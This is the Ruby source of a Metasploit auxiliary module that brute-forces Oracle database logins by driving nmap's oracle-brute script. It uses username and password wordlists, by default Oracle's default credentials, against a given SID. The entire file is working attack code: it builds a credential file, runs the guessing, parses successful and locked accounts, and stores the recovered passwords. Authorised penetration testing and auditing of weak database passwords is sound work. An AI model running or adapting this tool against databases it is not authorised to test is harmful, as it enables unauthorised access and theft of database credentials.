##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Nmap
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle RDBMS Login Utility',
      'Description'    => %q{
        This module attempts to authenticate against an Oracle RDBMS
        instance using username and password combinations indicated
        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.

        Due to a bug in nmap versions 6.50-7.80 may not work.
      },
      'Author'         => [
        'Patrik Karlsson <patrik[at]cqure.net>', # the nmap NSE script, oracle-brute.nse
        'todb' # this Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.oracle.com/database/' ],
          [ 'CVE', '1999-0502'], # Weak password CVE
          [ 'URL', 'https://nmap.org/nsedoc/scripts/oracle-brute.html']
        ]
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing (space-separated) users and passwords, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "oracle_default_userpass.txt") ]),
        OptString.new('SID', [ true, 'The instance (SID) to authenticate against', 'XE'])
      ])

  end

  def minimum_nmap_version
    "5.50"
  end

  def run
    unless nmap_version_at_least? minimum_nmap_version
      print_error "Installed Nmap version is not at least #{minimum_nmap_version}. Exiting..."
      return false
    end
    print_status "Nmap: Setting up credential file..."
    credfile = create_credfile
    cred_count = 0
    each_user_pass(true) {|user, pass| credfile[0].puts "%s/%s" % [user,pass]; cred_count += 1 }
    credfile[0].flush
    nmap_build_args(credfile[1])
    print_status "Nmap: Starting Oracle bruteforce with #{cred_count} credentials against SID '#{sid}'..."
    nmap_run
    credfile[0].unlink
    if Rex::Parser.nokogiri_loaded
      nmap_hosts {|type,data| process_nokogiri_callback(type,data)}
    else
      nmap_hosts {|host| process_host(host)}
    end
  end

  def sid
    datastore['SID'].to_s
  end

  def nmap_build_args(credpath)
    nmap_reset_args
    nmap_append_arg "-P0"
    nmap_append_arg "--script oracle-brute"
    script_args = [
      "tns.sid=#{sid}",
      "brute.mode=creds",
      "brute.credfile=#{credpath}",
      "brute.threads=1"
    ]
    script_args << "brute.delay=#{set_brute_delay}"
    nmap_append_arg "--script-args \"#{script_args.join(",")}\""
    nmap_append_arg "-n"
    nmap_append_arg "-v" if datastore['VERBOSE']
  end

  # Sometimes with weak little 10g XE databases, you will exhaust
  # available processes from the pool with lots and lots of
  # auth attempts, so use bruteforce_speed to slow things down
  def set_brute_delay
    case datastore["BRUTEFORCE_SPEED"]
    when 4; 0.25
    when 3; 0.5
    when 2; 1
    when 1; 15
    when 0; 60 * 5
    else; 0
    end
  end

  def create_credfile
    outfile = Rex::Quickfile.new("msf3-ora-creds-")
    if Rex::Compat.is_cygwin and self.nmap_bin =~ /cygdrive/i
      outfile_path = Rex::Compat.cygwin_to_win32(outfile.path)
    else
      outfile_path = outfile.path
    end
    @credfile = [outfile,outfile_path]
  end

  def process_nokogiri_callback(type,data)
    return unless type == :port_script
    return unless data["id"] == "oracle-brute"
    return unless data[:addresses].has_key? "ipv4"
    return unless data[:port]["state"] == ::Msf::ServiceState::Open
    addr = data[:addresses]["ipv4"].to_s
    port = data[:port]["portid"].to_i
    output = data["output"]
    parse_script_output(addr,port,output)
  end

  def process_host(h)
    h["ports"].each do |p|
      next if(h["scripts"].nil? || h["scripts"].empty?)
      h["scripts"].each do |id,output|
        next unless id == "oracle-brute"
        parse_script_output(h["addr"],p["portid"],output)
      end
    end
  end

  def extract_creds(str)
    m = str.match(/\s+([^\s]+):([^\s]+) =>/)
    m[1,2]
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: opts[:status],
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_script_output(addr,port,output)
    msg = "#{addr}:#{port} - Oracle -"
    @oracle_reported = false
    if output =~ /TNS: The listener could not resolve \x22/n
      print_error "#{msg} Invalid SID: #{sid}"
    elsif output =~ /Accounts[\s]+No valid accounts found/nm
      print_status "#{msg} No valid accounts found"
    else
      output.each_line do |oline|
        if oline =~ /Login correct/
          if not @oracle_reported
            report_service(:host => addr, :port => port, :proto => "tcp", :name => "oracle")
            report_note(:host => addr, :port => port, :proto => "tcp", :type => "oracle.sid", :data => { :sid => sid }, :update => :unique_data)
            @oracle_reported = true
          end
          user,pass = extract_creds(oline)
          pass = "" if pass == "<empty>"
          print_good "#{msg} Success: #{user}:#{pass} (SID: #{sid})"
          report_cred(
            ip: addr,
            port: port,
            user: "#{sid}/#{user}",
            password: pass,
            service_name: 'tcp',
            status: Metasploit::Model::Login::Status::SUCCESSFUL
          )
        elsif oline =~ /Account locked/
          if not @oracle_reported
            report_service(:host => addr, :port => port, :proto => "tcp", :name => "oracle")
            report_note(:host => addr, :port => port, :proto => "tcp", :type => "oracle.sid", :data => { :sid => sid }, :update => :unique_data)
            @oracle_reported = true
          end
          user = extract_creds(oline)[0]
          print_good "#{msg} Locked: #{user} (SID: #{sid}) -- account valid but locked"
          report_cred(
            ip: addr,
            port: port,
            user: "#{sid}/#{user}",
            service_name: 'tcp',
            status: Metasploit::Model::Login::Status::DENIED_ACCESS
          )
        elsif oline =~ /^\s+ERROR: (.*)/
          print_error "#{msg} NSE script error: #{$1}"
        end
      end
    end
  end
end
